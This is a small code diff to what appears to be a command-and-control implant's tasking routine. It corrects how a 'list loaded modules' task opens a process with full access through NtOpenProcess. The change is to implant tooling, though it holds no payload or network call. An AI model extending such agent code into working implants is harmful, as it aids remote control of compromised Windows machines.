@@ -54,14 +54,15 @@ void TaskingRoutine() {
 		        case LIST_LOADED_MODULES:
 					NTSTATUS NtStatus = 0x00;
 		    		PROCESS_BASIC_INFORMATION PBI = {0};
-		    		UINT32 ProcID = 0;
+		    		OBJECT_ATTRIBUTES ObjAttr = {0};
 		    		HANDLE hProc = NULL;
 		    		CLIENT_ID ClientID = {0};
-		    		ClientID.UniqueProcess = NtCurrentProcess();
-		    		ClientID.UniqueThread = NtCurrentProcess();
+		    		ClientID.UniqueProcess = agent->Context->PID;
+		    		ClientID.UniqueThread = agent->Context->TID;
 
-		    		ProcID = ParserReadInt32(&Parser);
-					hProc = agent->apis->pNtOpenProcess(&hProc, PROCESS_ALL_ACCESS, FALSE, &ClientID);
+		    		InitializeObjectAttributes(&ObjAttr, NULL, 0, NULL, NULL);
+
+					NtStatus = agent->apis->pNtOpenProcess(&hProc, PROCESS_ALL_ACCESS, &ObjAttr, &ClientID);
 
 
 					break;
